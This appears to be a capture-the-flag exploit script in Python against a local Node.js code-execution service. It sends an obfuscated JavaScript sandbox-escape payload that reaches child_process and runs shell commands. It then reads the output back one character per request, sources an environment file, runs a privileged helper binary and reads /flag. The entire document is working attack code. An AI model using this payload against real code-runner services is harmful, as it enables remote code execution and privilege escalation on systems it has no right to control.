import requests
import time

URL = "http://127.0.0.1:59995"
SID = "a8fc75f9ed2425fa585d82e221b79bd8"

def run_cmd(cmd):
    payload = f'new Proxy({{}},{{get(){{return function(a){{b=Reflect.ownKeys(a.__proto__)[4];c=a[b](decodeURI("return %70rocess"))();return a(c.mainModule[b]._load(decodeURI("child_%70rocess")).execSync("{cmd}"))}}}}}})'
    
    try:
        r = requests.post(f"{URL}/api/run",
                          headers={"X-Session-Id": SID, "Content-Type": "application/json"},
                          json={"code": payload},
                          timeout=10)
        if r.status_code != 204:
            return None
    except:
        return None
    
    result = ""
    cursor = 0
    while True:
        try:
            r = requests.get(f"{URL}/api/run",
                             headers={"X-Session-Id": SID},
                             params={"cursor": cursor},
                             timeout=10)
            if r.status_code != 200:
                break
            char = r.json().get("char", "")
            if not char:
                break
            result += char
            cursor += 1
        except:
            break
    return result


print(run_cmd("cat /tmp/setenv.sh'"))

cmd = ". /tmp/setenv.sh && /usr/local/bin/omni_pkexec"
run_cmd(cmd)
print(run_cmd("ls -la /flag"))
print(run_cmd("cat /flag 2>/dev/null"))

